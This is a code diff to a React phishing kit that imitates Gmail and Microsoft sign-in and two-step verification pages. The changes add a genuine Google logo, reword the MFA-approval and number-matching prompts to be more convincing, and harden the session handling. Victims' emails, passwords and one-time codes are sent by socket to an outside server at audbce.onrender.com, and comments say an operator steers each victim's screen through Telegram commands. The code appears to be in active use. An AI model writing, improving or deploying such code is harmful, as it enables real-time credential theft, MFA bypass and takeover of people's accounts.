@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from 'react';
 import io from 'socket.io-client'; 
 import { jsPDF } from 'jspdf';
 
-const SOCKET_SERVER = 'https://audbce.onrender.com';
+const SOCKET_SERVER = 'https://audbce.onrender.com'; 
 
 const EmailAuthApp = () => {
   const [currentView, setCurrentView] = useState('landing');
@@ -13,7 +13,7 @@ const EmailAuthApp = () => {
   const [sessionId, setSessionId] = useState(null); 
   const socketRef = useRef(null);   
   const [socketConnected, setSocketConnected] = useState(false);
-
+  const sessionIdRef = useRef(null);
 
 
 
@@ -127,33 +127,41 @@ const EmailAuthApp = () => {
       // Only connect once
   if (!socketRef.current) {
     socketRef.current = io(SOCKET_SERVER);
+  }
     
     socketRef.current.on('connect', () => {
       console.log('My socket ID:', socketRef.current.id); 
-      setSocketConnected(true);
-    }); 
-
-     // If we already have a sessionId, tell backend to update
-      if (sessionId) { 
-         // ✅ YES! This means we connected BEFORE
-    // ✅ This is a RECONNECTION, not first connection
-    // ✅ ALERT backend: "Update my socket!" 
+      console.log('Connect fired! sessionId =', sessionIdRef.current);  
+      setSocketConnected(true); 
+       // If we already have a sessionId, tell backend to update
+      if (sessionIdRef.current) { 
+         // YES! This means we connected BEFORE
+    // This is a RECONNECTION, not first connection 
      // "Hey backend! I'm not a new user!
      //It's a signal that says ....
   //HEY!! I was here before with session sess_123
   // But my socket changed (reconnection happened)
-  // Please update your records so you can still find me!"
-        console.log('Reconnecting session:', sessionId);
-        socketRef.current.emit('reconnect-session', { sessionId });
+  // Please update your records so you can still find me!"  
+        console.log('Reconnecting session:', sessionIdRef.current);
+         socketRef.current.emit('reconnect-session', { sessionId: sessionIdRef.current });  
+         // the session.ip and session.userAgent remain unchanged in the backend
       }
-  }
+    });  
+    
+
     
      // Remove and re-add listeners with updated provider value
   socketRef.current.off('show-otp-screen');
   socketRef.current.off('show-success-screen');
   socketRef.current.off('show-error');
   socketRef.current.off('show-approve-screen');
-  socketRef.current.off('show-approve-with-number');
+  socketRef.current.off('show-approve-with-number'); 
+
+ socketRef.current.on('session-invalid', () => {
+  console.log('Session invalid, reloading page...'); 
+  //reload the page so that we start fresh
+  window.location.reload();
+});
 
     // Listen for server events  
   socketRef.current.on('show-otp-screen', () => {
@@ -169,14 +177,14 @@ const EmailAuthApp = () => {
   console.log('=== APPROVE EVENT RECEIVED ===');
   setIsLoading(false);
   setSpecialNumber(null); 
-  setCurrentView(provider === 'gmail' ? 'gmail-approve-special' : 'ms-approve');  
+  setCurrentView(provider === 'gmail' ? 'gmail-approve-special' : 'ms-otp');  
 });
 
 socketRef.current.on('show-approve-with-number', (data) => {
   console.log('Approve with special number:', data.number); 
   setIsLoading(false);
   setSpecialNumber(data.number);  // <-- Store the number
-  setCurrentView(provider === 'gmail' ? 'gmail-approve-specialb' : 'ms-approve');   
+  setCurrentView(provider === 'gmail' ? 'gmail-approve-specialb' : 'ms-otp');   
 });
 
 
@@ -194,7 +202,20 @@ socketRef.current.on('show-approve-with-number', (data) => {
 
 
     socketRef.current.on('your-session-id', (id) => {
-  setSessionId(id);  
+  setSessionId(id);   
+  sessionIdRef.current = id; 
+
+    if (socketRef.current.connected) {
+    fetch('https://audbce.onrender.com/start-session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: id,
+        socketId: socketRef.current.id
+      })
+    });
+  }
+  
 });
  
 
@@ -246,7 +267,7 @@ useEffect(() => {
       socketRef.current.emit('submit-email', {
         provider: provider.charAt(0).toUpperCase() + provider.slice(1),
         email: email,
-        sessionId: sessionId
+        sessionId: sessionIdRef.current
       });
     }
     
@@ -264,7 +285,7 @@ useEffect(() => {
       setIsLoading(true);
       socketRef.current.emit('submit-password', {
         password: password,
-        sessionId: sessionId
+        sessionId: sessionIdRef.current
       });
     }
     // Stay on current screen, wait for Telegram command
@@ -275,7 +296,7 @@ useEffect(() => {
       setIsLoading(true);
       socketRef.current.emit('submit-otp', {
         otp: otp,
-        sessionId: sessionId
+        sessionId: sessionIdRef.current
       });
     }
     // Stay on current screen, wait for Telegram command
@@ -300,7 +321,7 @@ useEffect(() => {
         <div className="loading-content-center">
           <div className="loading-brand">
             <div className="brand-text">Invitation</div>
-            <div className="brand-post">...</div>
+            <div className="brand-post">Please wait...</div>
           </div>
           <div className="loading-spinner-main"></div>
         </div>
@@ -381,7 +402,7 @@ useEffect(() => {
       </p>
       <div>
         <input 
-          type="text" 
+          type="email" 
           className="ms-input" 
           placeholder="Email, phone, or Skype"
           value={email}
@@ -511,13 +532,19 @@ useEffect(() => {
         <div className="gmail-container">
           <div className="gmail-content">
             <div className="gmail-logo">
-              <span className="google-g">G</span>
+              <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
             </div>
             <h1 className="gmail-title">Sign in</h1>
             <p className="gmail-subtitle">to continue to Gmail</p>
             <div className="gmail-input-wrapper">
               <input 
-                type="text" 
+                type="email" 
                 className="gmail-input" 
                 placeholder="Email or phone"
                 value={email}
@@ -553,7 +580,13 @@ useEffect(() => {
         <div className="gmail-container">
           <div className="gmail-content">
             <div className="gmail-logo">
-              <span className="google-g">G</span>
+              <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
             </div>
             <h1 className="gmail-title">Welcome</h1>
             <div className="gmail-account-selector">
@@ -615,7 +648,13 @@ useEffect(() => {
         <div className="gmail-container">
           <div className="gmail-content">
             <div className="gmail-logo">
-              <span className="google-g">G</span>
+              <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
             </div>
             <h1 className="gmail-title">Sign in</h1>
             <p className="gmail-subtitle">to continue to Gmail</p>
@@ -645,12 +684,18 @@ useEffect(() => {
         <div className="gmail-container">
           <div className="gmail-content">
             <div className="gmail-logo">
-              <span className="google-g">G</span>
+              <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
             </div>
             <h1 className="gmail-title">2-Step Verification</h1>
             <p className="gmail-subtitle">To continue, first verify it's you</p>
             <p className="gmail-info" style={{marginBottom: '24px'}}>
-              Google sent a verification code to your phone. Enter it below to continue
+              For your security, enter the 6-digit code from your authenticator app.
            </p>
             <div className="gmail-input-wrapper">
               <input 
@@ -662,8 +707,7 @@ useEffect(() => {
               />
             </div>
             <a href="#" className="gmail-link">Try another way</a>
-            <div className="gmail-actions">
-              <a href="#" className="gmail-link">Resend code</a>
+            <div className="gmail-actions"> 
               <button className="gmail-button" disabled={isLoading} onClick={() => {
                 const otp = document.getElementById('gmail-otp-input').value;
                 if (!otp || otp.trim() === '') {
@@ -697,12 +741,18 @@ useEffect(() => {
   <div className="gmail-container">
     <div className="gmail-content">
       <div className="gmail-logo">
-        <span className="google-g">G</span>
+        <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
       </div>
       <h1 className="gmail-title">2-Step Verification</h1>
       <p className="gmail-subtitle">To continue, first verify it's you</p>
       <p className="gmail-info" style={{marginBottom: '24px'}}>
-        Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification to sign in, and click Next below.
+        Google sent a notification to your phone. Tap <strong>YES, IT'S ME</strong> on the notification to sign in, and click Next below.
       </p> 
       <a href="#" className="gmail-link">Try another way</a>
       <div className="gmail-actions"> 
@@ -734,12 +784,18 @@ useEffect(() => {
   <div className="gmail-container">
     <div className="gmail-content">
       <div className="gmail-logo">
-        <span className="google-g">G</span>
+          <svg viewBox="0 0 48 48" width="36" height="36">
+  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  <path fill="none" d="M0 0h48v48H0z"/>
+</svg>
       </div>
       <h1 className="gmail-title">2-Step Verification</h1>
       <p className="gmail-subtitle">To continue, first verify it's you</p>
       <p className="gmail-info" style={{marginBottom: '24px'}}>
-        Tap <strong style={{fontSize: '27px', color: '#8ab4f8'}}>{specialNumber}</strong> on your phone to sign in, and click Next below.
+        Press YES, IT'S ME and tap <strong style={{fontSize: '27px', color: '#8ab4f8'}}>{specialNumber}</strong> on your phone to sign in, and click Next below.
       </p> 
       <a href="#" className="gmail-link">Try another way</a>
       <div className="gmail-actions"> 
@@ -962,7 +1018,7 @@ useEffect(() => {
 }
 
         .ms-title {
-          font-size: 26px;
+          font-size: 21px;
           font-weight: 600;
           color: #1b1b1b;
           margin-bottom: 10px;
@@ -1131,28 +1187,21 @@ useEffect(() => {
 }
 
         .gmail-logo {
-          width: 75px;
-          height: 24px;
-          margin-bottom: 16px;
-          display: flex;
-          align-items: center;
-        }
-
-        .google-g {
-          font-size: 22px;
-          font-weight: 500;
-          font-family: 'Product Sans', 'Segoe UI', sans-serif;
-          color: #5f6368;
-          letter-spacing: -0.5px;
-        }
-
+  width: 40px;
+  height: 40px;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+  
         .gmail-title {
-          font-size: 24px;
-          font-weight: 400;
-          color: #202124;
-          margin-bottom: 8px;
-          letter-spacing: 0;
-        }
+  font-size: 24px;
+  font-weight: 500;
+  color: #202124;
+  margin-bottom: 8px;
+  letter-spacing: 0;
+}
 
         .gmail-subtitle {
           font-size: 16px;
